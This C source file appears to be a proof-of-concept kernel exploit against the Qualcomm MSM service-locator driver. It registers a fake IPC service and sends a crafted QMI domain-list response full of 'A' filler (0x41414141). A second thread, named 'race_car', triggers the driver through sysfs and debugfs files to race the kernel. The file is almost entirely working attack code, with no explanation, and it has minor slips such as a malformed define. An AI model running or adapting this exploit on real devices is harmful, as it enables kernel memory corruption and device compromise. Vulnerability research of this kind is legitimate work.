#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/types.h>          /* See NOTES */
#include <sys/socket.h>
#include <fcntl.h>
#include <stdbool.h>
#include <errno.h>
#include <string.h>
#include <pthread.h>
#include "qmi_encdec.h"
#include "service-locator-private.h"

struct msm_ipc_port_addr {
	uint32_t node_id;
	uint32_t port_id;
};

struct msm_ipc_port_name {
	uint32_t service;
	uint32_t instance;
};

struct msm_ipc_addr {
	unsigned char  addrtype;
	union {
		struct msm_ipc_port_addr port_addr;
		struct msm_ipc_port_name port_name;
	} addr;
};


/*
 * Socket API
 */

#define AF_MSM_IPC 27

#define PF_MSM_IPCAF_MSM_IPC

#define MSM_IPC_ADDR_NAME 1
#define MSM_IPC_ADDR_ID 2

struct sockaddr_msm_ipc {
	unsigned short family;
	struct msm_ipc_addr address;
	unsigned char reserved;
};

#define QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_V01 0x0021
#define QMI_RESPONSE_CONTROL_FLAG 0x02
volatile int wait = 1;

static const char *ThirtyOneAs =
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

static void recv_msgs(int fd)
{
	//ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags);
	struct msghdr msg = { 0 };
	struct iovec io = { 0 };
	struct sockaddr_msm_ipc addr = { 0 };
	struct msm_ipc_addr address = { 0 };
	uint8_t *ptr;
	struct qmi_header *hdr;
	struct qmi_servreg_loc_get_domain_list_resp_msg_v01 resp = { 0 };
	int count = 1;
	struct msg_desc resp_desc;

	printf("sizeof hdr %zu\n", sizeof(*hdr));
	//memset(&address, 0, sizeof(address));

	io.iov_base = malloc(4096);
	memset(io.iov_base, 0, 4096);
	io.iov_len = QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_MSG_V01_MAX_MSG_LEN + sizeof(*hdr);


	msg.msg_iovlen = 1;
	msg.msg_iov = &io;
	msg.msg_name = &addr;
	msg.msg_namelen = sizeof(addr);

	
	recvmsg(fd, &msg, MSG_CMSG_CLOEXEC);
	printf("node_id %u and port_id %u\n",
	       addr.address.addr.port_addr.node_id,
	       addr.address.addr.port_addr.port_id);
	hdr = io.iov_base;

	hdr->cntl_flag = QMI_RESPONSE_CONTROL_FLAG;
	//hdr->txn_id++;
	hdr->msg_id = QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_V01;
	hdr->msg_len = QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_MSG_V01_MAX_MSG_LEN;
		//io.iov_len = sizeof(hdr);

	ptr = io.iov_base + sizeof(*hdr);
	memset(ptr, 0, 4096 - sizeof(*hdr));
	resp_desc.msg_id = QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_V01;
	resp_desc.max_msg_len =
		QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_MSG_V01_MAX_MSG_LEN;
	resp_desc.ei_array = qmi_servreg_loc_get_domain_list_resp_msg_v01_ei;


	//resp = io.iov_base + sizeof(*hdr);
	resp.total_domains_valid = 1;
	resp.total_domains = 1;
	resp.db_rev_count_valid = 1;
	resp.db_rev_count = 4;
	resp.total_domains = 4;
	resp.domain_list_valid = 1;
	resp.domain_list_len = QMI_SERVREG_LOC_LIST_LENGTH_V01;
	int i;
	for (i = 0; i < resp.domain_list_len; i++) {
		strcpy(resp.domain_list[i].name, ThirtyOneAs);
		resp.domain_list[i].instance_id = 0x41414141;
		resp.domain_list[i].service_data_valid = 1;
		resp.domain_list[i].service_data = 0x41414141;
	}
	printf("max msg len is %zu and our out len is %zu\n",
	       QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_MSG_V01_MAX_MSG_LEN,
	       4096 - sizeof(*hdr));
	int ret = qmi_kernel_encode(&resp_desc, ptr, QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_MSG_V01_MAX_MSG_LEN, &resp);
	if (ret < 0) {
		printf("ret < 0\n");
	}
	printf("\n STARTING DECODE\n");
	qmi_kernel_decode(&resp_desc, &resp, ptr, QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_MSG_V01_MAX_MSG_LEN);


	//address.addrtype = MSM_IPC_ADDR_ID;
	sendmsg(fd, &msg, MSG_CMSG_CLOEXEC);
		//printf("msg %s\n", strerror(errno));
		//print_msg(io.iov_base);
	printf("sleeping for 16\n");
	sleep(15);

}

void *do_sys_read(void *_fd)
{

	char test[1024] = { 0 };
	int fd = *(int*)_fd;
	int srv_lktr;
	srv_lktr = open("/sys/class/service_locator/service_locator_status", O_RDWR);
	write(srv_lktr, "1", 1);
	printf("wrote srv_lktr with %s\n", strerror(errno));
	read(fd, test, sizeof(test));
	printf("Read complete with %s\n", strerror(errno));
	printf("%s\n",test);
	wait = 0;
	sleep(15);
}


#define SERVREG_LOC_SERVICE_ID_V01 0x40
#define SERVREG_LOC_SERVICE_VERS_V01 0x01
#define SERVREG_LOC_SERVICE_INSTANCE_ID                 1
#define BUILD_INSTANCE_ID(vers, ins) (((vers) & 0xFF) | (((ins) & 0xFF) << 8))
static void setup_ipc_server(void)
{
	int fd;
	int test_srvc;
	pthread_t race_car;
	struct sockaddr_msm_ipc addr = { 0 };
	fd = socket(AF_MSM_IPC, SOCK_DGRAM, 0);

	if (fd < 0) {
		printf("Couldn't open socket %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}

	addr.family = AF_MSM_IPC;
	addr.address.addrtype = MSM_IPC_ADDR_NAME;
	addr.address.addr.port_name.service = SERVREG_LOC_SERVICE_ID_V01;
	addr.address.addr.port_name.instance =
		BUILD_INSTANCE_ID(SERVREG_LOC_SERVICE_VERS_V01, SERVREG_LOC_SERVICE_INSTANCE_ID);

	bind(fd, (struct sockaddr *) &addr, sizeof(addr));
	printf("bind with strerror %s\n", strerror(errno));
	printf("opening test_service\n");
	test_srvc = open("/sys/kernel/debug/test_servloc", O_RDWR);
	if (!test_srvc) {
		close(fd);
		printf("failed to open test_srvloc with %s\n", strerror(errno));
		exit(1);
	}
	printf("service opened\n");
	printf("reading\n");
	pthread_create(&race_car, NULL, do_sys_read, &test_srvc);
	recv_msgs(fd);
}


int main(void)
{
	setup_ipc_server();
}
